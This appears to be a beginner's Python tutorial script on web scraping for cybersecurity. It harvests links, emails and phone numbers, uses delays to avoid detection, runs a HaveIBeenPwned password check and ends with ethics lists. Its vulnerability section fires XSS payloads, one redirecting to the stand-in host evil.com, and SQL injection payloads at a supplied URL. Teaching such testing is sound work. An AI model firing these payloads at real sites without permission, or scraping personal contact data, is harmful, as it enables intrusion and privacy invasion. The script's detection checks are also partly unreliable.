#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web Scraping in Python for Cybersecurity
This script demonstrates web scraping techniques using requests and BeautifulSoup
with cybersecurity-relevant examples and detailed explanations.
Perfect for beginners!
"""

# Import necessary modules
import requests                  # For making HTTP requests
from bs4 import BeautifulSoup    # For parsing HTML content
import re                        # For regular expressions
import csv                       # For CSV file handling
import time                      # For adding delays
import random                    # For random delays

# ==========================================
# 1. Basic Web Scraping
# ==========================================
print("=== Basic Web Scraping ===\n")

def basic_scraping(url):
    """
    Perform basic web scraping to extract information from a webpage.
    
    Args:
        url: URL of the webpage to scrape
        
    Returns:
        Dictionary containing extracted information
    """
    # Set user agent to mimic browser behavior
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        # Make HTTP GET request to the webpage
        response = requests.get(url, headers=headers)
        
        # Check if request was successful
        if response.status_code != 200:
            print(f"Error: HTTP {response.status_code} - Failed to retrieve page")
            return None
            
        # Parse HTML content
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract information
        results = {
            'title': soup.title.string.strip() if soup.title else 'No title',
            'links': extract_links(soup),
            'images': extract_images(soup),
            'email_addresses': extract_emails(soup),
            'phone_numbers': extract_phone_numbers(soup)
        }
        
        return results
        
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

def extract_links(soup):
    """Extract all links from webpage"""
    links = []
    for anchor in soup.find_all('a', href=True):
        href = anchor['href']
        # Only include valid URLs (skip mailto, javascript, etc.)
        if href.startswith('http'):
            links.append(href)
    return links

def extract_images(soup):
    """Extract all images from webpage"""
    images = []
    for img in soup.find_all('img', src=True):
        src = img['src']
        # Only include valid image URLs
        if src.startswith('http'):
            images.append(src)
    return images

def extract_emails(soup):
    """Extract email addresses from webpage"""
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    text = soup.get_text()
    return re.findall(email_pattern, text)

def extract_phone_numbers(soup):
    """Extract phone numbers from webpage"""
    # Basic phone number pattern (will vary by region)
    phone_pattern = r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'
    text = soup.get_text()
    return re.findall(phone_pattern, text)

# Test basic scraping on example.com
test_url = "https://example.com"
print(f"Scraping {test_url}...")
scraping_results = basic_scraping(test_url)

if scraping_results:
    print(f"\nTitle: {scraping_results['title']}")
    print(f"Links: {len(scraping_results['links'])} links found")
    print(f"Images: {len(scraping_results['images'])} images found")
    print(f"Emails: {len(scraping_results['email_addresses'])} emails found")
    print(f"Phone numbers: {len(scraping_results['phone_numbers'])} phone numbers found")
else:
    print("Failed to scrape the website")

print()
print("=" * 50)
print()

# ==========================================
# 2. Advanced Web Scraping
# ==========================================
print("=== Advanced Web Scraping ===\n")

def scrape_with_delay(url, delay_min=1, delay_max=3):
    """
    Scrape webpage with random delays to avoid detection.
    
    Args:
        url: URL of the webpage to scrape
        delay_min: Minimum delay in seconds
        delay_max: Maximum delay in seconds
        
    Returns:
        BeautifulSoup object if successful, None otherwise
    """
    # Add random delay
    delay = random.uniform(delay_min, delay_max)
    print(f"Waiting {delay:.2f} seconds before scraping...")
    time.sleep(delay)
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            return BeautifulSoup(response.text, 'html.parser')
        else:
            print(f"Error: HTTP {response.status_code}")
            return None
            
    except Exception as e:
        print(f"Error: {e}")
        return None

# Test scraping with delay
print("Testing scraping with delay...")
soup = scrape_with_delay(test_url)

if soup:
    print(f"\nSuccessfully scraped with delay: {soup.title.string}")
else:
    print("Failed to scrape with delay")

print()
print("=" * 50)
print()

# ==========================================
# 3. Web Vulnerability Testing
# ==========================================
print("=== Web Vulnerability Testing ===\n")

def check_xss_vulnerability(url, params):
    """
    Check for Cross-Site Scripting (XSS) vulnerabilities in parameters.
    
    Args:
        url: Base URL to test
        params: Dictionary of parameters to test
        
    Returns:
        Dictionary of vulnerable parameters
    """
    vulnerable_params = {}
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"'><script>alert('XSS')</script>",
        "<script>document.location='http://evil.com'</script>"
    ]
    
    for param_name, param_value in params.items():
        print(f"\nTesting parameter: {param_name}")
        
        for payload in xss_payloads:
            # Replace parameter value with XSS payload
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                response = requests.get(url, params=test_params)
                
                # Check if payload is reflected in response
                if payload in response.text:
                    print(f"  Vulnerable to XSS with payload: {payload}")
                    if param_name not in vulnerable_params:
                        vulnerable_params[param_name] = []
                    vulnerable_params[param_name].append(payload)
                    
            except Exception as e:
                print(f"  Error: {e}")
                
    return vulnerable_params

def check_sql_injection(url, params):
    """
    Check for SQL injection vulnerabilities in parameters.
    
    Args:
        url: Base URL to test
        params: Dictionary of parameters to test
        
    Returns:
        Dictionary of vulnerable parameters
    """
    vulnerable_params = {}
    sql_payloads = [
        "' OR 1=1 --",
        "admin' --",
        "' UNION SELECT 1,2 --",
        "' AND SLEEP(5) --"
    ]
    
    for param_name, param_value in params.items():
        print(f"\nTesting parameter: {param_name}")
        
        for payload in sql_payloads:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                # Check response time for time-based SQLi
                start_time = time.time()
                response = requests.get(url, params=test_params, timeout=10)
                response_time = time.time() - start_time
                
                # Check for common SQL error patterns
                sql_errors = [
                    "MySQL", "PGSQL", "SQLite", "ORA-", "SQL error", "syntax error"
                ]
                
                is_vulnerable = False
                error_found = False
                
                for error in sql_errors:
                    if error in response.text.lower():
                        print(f"  SQL error detected: {error}")
                        error_found = True
                        is_vulnerable = True
                
                if response_time > 4:
                    print(f"  Time-based SQLi detected (response time: {response_time:.2f} seconds)")
                    is_vulnerable = True
                
                if is_vulnerable:
                    if param_name not in vulnerable_params:
                        vulnerable_params[param_name] = []
                    vulnerable_params[param_name].append(payload)
                    
            except requests.exceptions.Timeout:
                print(f"  Timeout - possible time-based SQLi")
                if param_name not in vulnerable_params:
                    vulnerable_params[param_name] = []
                vulnerable_params[param_name].append(payload)
            except Exception as e:
                print(f"  Error: {e}")
                
    return vulnerable_params

# Test vulnerability checking on a test site
test_url = "https://example.com/search"
test_params = {
    'q': 'test',
    'category': '1',
    'page': '1'
}

print("Checking for XSS vulnerabilities...")
xss_vulns = check_xss_vulnerability(test_url, test_params)
if xss_vulns:
    print(f"\nXSS vulnerabilities found: {len(xss_vulns)} parameters")
    for param, payloads in xss_vulns.items():
        print(f"  Parameter {param}: {len(payloads)} payloads worked")
else:
    print("\nNo XSS vulnerabilities found")

print()
print("Checking for SQL injection vulnerabilities...")
sql_vulns = check_sql_injection(test_url, test_params)
if sql_vulns:
    print(f"\nSQL injection vulnerabilities found: {len(sql_vulns)} parameters")
    for param, payloads in sql_vulns.items():
        print(f"  Parameter {param}: {len(payloads)} payloads worked")
else:
    print("\nNo SQL injection vulnerabilities found")

print()
print("=" * 50)
print()

# ==========================================
# 4. API Interaction
# ==========================================
print("=== API Interaction ===\n")

def check_password_breach(password):
    """
    Check if a password has been compromised in data breaches.
    
    Args:
        password: Password to check
        
    Returns:
        Number of times password has been seen in breaches
    """
    import hashlib
    
    # Hash the password using SHA-1 (required by HaveIBeenPwned API)
    sha1_hash = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
    prefix = sha1_hash[:5]
    suffix = sha1_hash[5:]
    
    try:
        response = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
        if response.status_code == 200:
            # Find matching suffix in response
            hashes = response.text.split('\n')
            for line in hashes:
                if line:
                    hash_suffix, count = line.split(':')
                    if hash_suffix == suffix:
                        return int(count)
        return 0
        
    except Exception as e:
        print(f"Error checking password: {e}")
        return -1

# Test password breach checking
test_passwords = ["password123", "SecurePassword123!", "admin123"]
print("Checking if passwords have been breached:")

for password in test_passwords:
    count = check_password_breach(password)
    
    if count == -1:
        status = "❌ Error checking"
    elif count > 0:
        status = f"⚠️ Breached {count:,} times"
    else:
        status = "✅ Not breached"
        
    print(f"  {password}: {status}")

print()
print("=" * 50)
print()

# ==========================================
# 5. Data Extraction and Storage
# ==========================================
print("=== Data Extraction and Storage ===\n")

def scrape_links_to_csv(url, output_file="scraped_links.csv"):
    """
    Scrape links from a webpage and save to CSV file.
    
    Args:
        url: URL to scrape
        output_file: Output CSV file name
    """
    soup = scrape_with_delay(url)
    if soup:
        links = extract_links(soup)
        
        with open(output_file, 'w', newline='', encoding='utf-8') as csv_file:
            writer = csv.writer(csv_file)
            writer.writerow(['Link'])
            
            for link in links:
                writer.writerow([link])
                
        print(f"Saved {len(links)} links to {output_file}")
    else:
        print("Failed to scrape links")

# Test scraping and saving links
test_url = "https://example.com"
print(f"Scraping links from {test_url}...")
scrape_links_to_csv(test_url)

# Verify the file was created
import os
if os.path.exists("scraped_links.csv"):
    print("File created successfully")
    # Clean up the file
    os.remove("scraped_links.csv")

print()

print("=" * 50)
print()

# ==========================================
# 6. Ethical Considerations
# ==========================================
print("=== Ethical Considerations ===\n")

ethical_guidelines = [
    "1. Always obtain explicit permission before scraping any website",
    "2. Respect robots.txt and website terms of service",
    "3. Implement rate limiting and delays to avoid overloading servers",
    "4. Don't scrape sensitive or private information",
    "5. Be transparent about your scraping activities",
    "6. Comply with applicable laws and regulations",
    "7. Consider the impact on website owners and their resources"
]

print("Web Scraping Ethical Guidelines:")
for guideline in ethical_guidelines:
    print(f"  {guideline}")

print()

print("=" * 50)
print()

# ==========================================
# 7. Best Practices
# ==========================================
print("=== Best Practices ===\n")

best_practices = [
    "• Use appropriate user agents to identify your bot",
    "• Implement request throttling and rate limiting",
    "• Handle errors and exceptions gracefully",
    "• Respect robots.txt directives",
    "• Cache responses to avoid unnecessary requests",
    "• Use appropriate parsing libraries (BeautifulSoup, lxml)",
    "• Monitor and respect website behavior",
    "• Test on staging environments first",
    "• Consider legal implications and obtain permission"
]

print("Web Scraping Best Practices:")
for practice in best_practices:
    print(f"  {practice}")

print()
